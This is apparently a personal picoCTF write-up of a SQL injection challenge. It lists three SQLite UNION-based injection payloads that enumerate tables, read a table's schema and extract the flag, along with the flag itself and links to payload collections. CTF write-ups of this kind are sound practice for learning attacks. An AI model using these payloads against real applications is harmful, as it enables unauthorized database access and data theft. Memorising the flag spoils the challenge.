
first command that showed more info

' union select 0, 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --

first command output showed
2 more tables,

hints and more_table

second command
' union select null,null,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='more_table'--

second command output

CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)

final command

' union select null,null,flag from more_table--

output

If you are here, you must have seen it

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}


used this as reference: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
https://github.com/payloadbox/sql-injection-payload-list
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md